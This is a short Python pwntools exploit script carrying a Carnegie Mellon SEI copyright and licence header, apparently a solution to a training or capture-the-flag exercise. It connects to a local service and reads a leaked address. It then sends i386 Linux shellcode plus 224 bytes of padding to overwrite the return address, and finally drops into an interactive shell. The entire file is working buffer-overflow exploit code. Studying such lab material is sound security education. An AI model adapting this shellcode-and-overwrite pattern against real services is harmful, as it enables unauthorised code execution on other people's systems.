#!/usr/bin/python3

# Copyright 2022 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

import pwn #imports pwntools
from pwn import *
offset = 224
sock=remote('localhost',11111) #connects to socket
input = sock.recvline_startswith("Your input") #waitings until start address
print(input) #prints start address
input = (input[-10:]) #removes other characters from line
input=(input.decode("utf-8")) #decodes address
key = p32(int(input, 0))
print(key) #prints key in little endian
sock.recvline(1024) #Enter username
padding = "A" * offset
print(bytes(padding, "utf-8") + key)
sock.sendline(asm(shellcraft.i386.linux.sh()) + bytes(padding, "utf-8") + key) #Sends shell code then padding then key
sock.sendline( bytes(padding, "utf-8") + key) #Sends username
a = sock.recv(1024) #Hello, username, Enter Password
print(a)
sock.sendline("password")
while True:
    a = sock.recvline(timeout=1)
    print(a)
    try:
        if 'Incorrect' in a.decode('utf-8'):
            sock.sendline('password')
        if a == b'':
            sock.interactive() #sends you to an interactive shell
    except:
        pass

